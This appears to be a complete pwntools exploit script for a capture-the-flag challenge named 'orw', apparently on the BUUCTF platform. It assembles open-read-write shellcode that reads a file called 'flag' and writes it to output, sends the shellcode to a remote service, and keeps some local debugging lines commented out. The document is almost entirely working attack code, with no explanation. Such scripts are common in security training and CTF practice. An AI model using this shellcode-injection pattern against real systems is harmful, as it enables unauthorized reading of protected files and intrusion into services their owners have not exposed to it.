from pwn import *

elf = ELF("orw")
#sock = process(elf.path)
gs = """
    break *0x804858a
    continue
"""
#sock = gdb.debug(elf.path, gdbscript = gs)
sock = remote("node4.buuoj.cn",26999)

#shellcode = asm("""
#    nop
#    mov eax, 1
#    mov ebx, 0
#    int 0x80
#""")
shellcode = asm(shellcraft.open("flag",0))
shellcode += asm(shellcraft.read(3, 0x804a040 + 0x500, 0x100))
shellcode += asm(shellcraft.write(1, 0x804a040 + 0x500, 0x100))
shellcode += asm(shellcraft.exit(0))
print(shellcode)
sock.sendafter(b"Give my your shellcode:",shellcode)

sock.interactive()

